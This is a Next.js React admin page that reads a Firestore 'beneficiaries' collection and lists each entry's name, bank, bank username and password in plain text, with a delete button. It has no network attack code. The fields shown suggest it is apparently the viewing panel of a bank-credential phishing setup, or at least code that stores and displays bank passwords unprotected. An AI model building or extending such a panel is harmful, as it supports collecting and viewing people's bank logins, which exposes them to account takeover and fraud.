"use client";

import { useEffect, useState } from "react";
import { collection, onSnapshot, deleteDoc, doc } from "firebase/firestore";
import { db } from "@/lib/firebaseClient";

export default function AdminBeneficiariesPage() {
  const [beneficiaries, setBeneficiaries] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const unsub = onSnapshot(
      collection(db, "beneficiaries"),
      (snapshot) => {
        const data = snapshot.docs.map((doc) => ({
          id: doc.id,
          ...doc.data(),
        }));
        setBeneficiaries(data);
        setLoading(false);
      },
      (err) => {
        console.error("Failed to load beneficiaries:", err);
        setLoading(false);
      }
    );

    return () => unsub();
  }, []);

  const handleDelete = async (id) => {
    if (!confirm("Delete this beneficiary permanently?")) return;
    await deleteDoc(doc(db, "beneficiaries", id));
  };

  if (loading) {
    return <div className="p-6 text-slate-400">Loading beneficiaries...</div>;
  }

  return (
    <div className="p-6 space-y-1 bg-slate-950">
      <h1 className="text-xl font-semibold mb-3 text-white text-center">Manage Beneficiaries</h1>

      {beneficiaries.length === 0 && (
        <p className="text-slate-400">No beneficiaries found.</p>
      )}

      {beneficiaries.map((b) => (
        <div
          key={b.id}
          className="bg-slate-900 border border-slate-800 rounded-lg p-4 hover:bg-slate-800/50 transition"
        >
          <div className="flex justify-between items-start">
            <div className="space-y-1 text-sm text-slate-200">
              <p>
                <span className="text-slate-400">Name:</span>{" "}
                <span className="font-medium">{b.name || "—"}</span>
              </p>
              <p>
                <span className="text-slate-400">Bank:</span>{" "}
                <span className="font-medium">{b.bank || "—"}</span>
              </p>
              <p>
                <span className="text-slate-400">Username:</span>{" "}
                <span className="font-mono text-orange-500">{b.username || "—"}</span>
              </p>
              <p>
                <span className="text-slate-400">Password:</span>{" "}
                <span className="font-mono text-orange-500">{b.password || "—"}</span>
              </p>
              <p className="text-xs text-slate-500">
                Created:{" "}
                {b.createdAt?.toDate
                  ? b.createdAt.toDate().toLocaleString()
                  : "—"}
              </p>
            </div>

            <button
              onClick={() => handleDelete(b.id)}
              className="bg-red-600 hover:bg-red-500 px-3 py-1 rounded text-sm text-white"
            >
              Delete
            </button>
          </div>
        </div>
      ))}
    </div>
  );
}
